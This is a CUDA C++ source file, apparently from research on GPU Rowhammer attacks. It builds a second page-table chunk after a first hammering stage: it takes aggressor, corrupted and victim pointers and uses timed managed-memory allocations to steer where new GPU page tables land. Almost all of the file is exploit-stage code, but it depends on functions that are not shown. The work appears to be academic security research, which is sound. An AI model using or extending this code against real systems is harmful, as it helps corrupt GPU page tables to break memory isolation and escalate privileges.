#include "sc_firstPTC_hammer.cuh"
#include "sc_secondPTC.cuh"
#include <chrono>
#include <thread>

uint64_t
second_PT_chunk_evict (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc = std::stoll (argv[1]);
  const uint64_t alloc_id = std::stoll (argv[2]);
  const double threshold = std::stod (argv[3]);
  const uint64_t skip = std::stoull (argv[4]);

  char *temp;
  char **first_ptc_ptrs;
  char *agg_ptr, *corrupted_ptr, *victim_ptr;
  int timein;
  if (!first_PT_chunk_attack (num_alloc_init, num_alloc, alloc_id, threshold,
                              skip, &first_ptc_ptrs, &agg_ptr, &corrupted_ptr,
                              &victim_ptr, nullptr, nullptr))
    {
      printf ("Error: First PTC Allocation is wrong\n");
      exit (1);
    }

  std::cout << (void*)first_ptc_ptrs[7390] << '\n';
  std::cout << "Ready to Start Second PTC Test " << '\n';
  std::cin.clear ();
  std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
  std::cin >> timein;

  double minTimeMS = 0;
  // 892

  std::cout << (void *)((uintptr_t)corrupted_ptr & ~((1UL << 20) - 1)) << '\n';
  std::cout << (void *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1)) << '\n';
  // for (int j = 0; j < 2 * 1024 * 1024; j += 64 * 1024)
  //       *(first_ptc_ptrs[0] + j) = 'a';

  for (int j = 0; j < 2 * 1024 * 1024; j += 64 * 1024)
    *(first_ptc_ptrs[0] + j) = 'a';
  for (uint64_t i = 1; i < 888; i += 1)
    {
      if (i == 887)
        {
          for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(first_ptc_ptrs[7390] + j) = 'a';
        }
      // Create Free Space
      cudaMallocManaged (&temp, 2 * 1024 * 1024 + 4096);

      auto start = std::chrono::high_resolution_clock::now ();
      initialize_memory<<<1, 1>>> (temp + 2 * 1024 * 1024, 1);
      cudaDeviceSynchronize ();
      auto end = std::chrono::high_resolution_clock::now ();

      gpuErrchk (cudaPeekAtLastError ());
      std::chrono::duration<double, std::milli> duration_evict = end - start;
      double currentMS = duration_evict.count ();
      std::cout << i << " New PT time: " << duration_evict.count () << " ms" << (void*)temp << std::endl;

      if (i < skip)
        continue;
    }

  std::cout << "Second attack PTC created " << '\n';
  std::cin.clear ();
  std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
  std::cin >> timein;
  return 0;
}

bool
second_PT_chunk (uint64_t num_alloc_init, uint64_t num_alloc,
                 uint64_t num_alloc_second, uint64_t alloc_id,
                 double threshold, uint64_t skip)
{
  char *temp;
  char **first_ptc_ptrs;
  char *agg_ptr, *corrupted_ptr, *victim_ptr;
  uint64_t corrupt_id, victim_id;
  int timein;
  if (!first_PT_chunk_attack (num_alloc_init, num_alloc, alloc_id, threshold,
                              skip, &first_ptc_ptrs, &agg_ptr, &corrupted_ptr,
                              &victim_ptr, &corrupt_id, &victim_id))
    {
      printf ("Error: First PTC Allocation is wrong\n");
      exit (1);
    }

  std::cout << "Ready to Start Second PTC Test " << '\n';
  std::cin.clear ();
  std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
  std::cin >> timein;

  double minTimeMS = 0;
  // 892

  std::cout << (void *)((uintptr_t)corrupted_ptr & ~((1UL << 20) - 1)) << '\n';
  std::cout << (void *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1)) << '\n';
  std::cout << victim_id << ' ' << corrupt_id << '\n';

  for (int j = 0; j < 2 * 1024 * 1024; j += 64 * 1024)
    *(first_ptc_ptrs[0] + j) = 'a';
  for (uint64_t i = 1; i < num_alloc_second; i++)
    {
      // Final write at the end
      if (i == num_alloc_second - 1)
        {
          for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(first_ptc_ptrs[victim_id] + j) = 'a';
        }

      // valid_count++;

      // Create Free Space
      cudaMallocManaged (&temp, 2 * 1024 * 1024 + 4096);
      auto start = std::chrono::high_resolution_clock::now ();
      initialize_memory<<<1, 1>>> (temp + 2 * 1024 * 1024, 1);
      cudaDeviceSynchronize ();
      auto end = std::chrono::high_resolution_clock::now ();

      gpuErrchk (cudaPeekAtLastError ());
      std::chrono::duration<double, std::milli> duration_evict = end - start;
      double currentMS = duration_evict.count ();
      std::cout << i << " New PT time: " << duration_evict.count () << " ms"
                << std::endl;

      // Generate Page Table for 64KB Pages.
      // *(temp + 0) = 'a';

      if (i < skip)
        continue;
    }

  std::cout << "Second attack PTC created " << '\n';
  std::cin.clear ();
  std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
  std::cin >> timein;
  return 0;
}

bool
second_PT_chunk (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc = std::stoll (argv[1]);
  const uint64_t num_alloc_second = std::stoll (argv[2]);
  const uint64_t alloc_id = std::stoll (argv[3]);
  const double threshold = std::stod (argv[4]);
  const uint64_t skip = std::stoull (argv[5]);

  return second_PT_chunk (num_alloc_init, num_alloc, num_alloc_second,
                          alloc_id, threshold, skip);
}
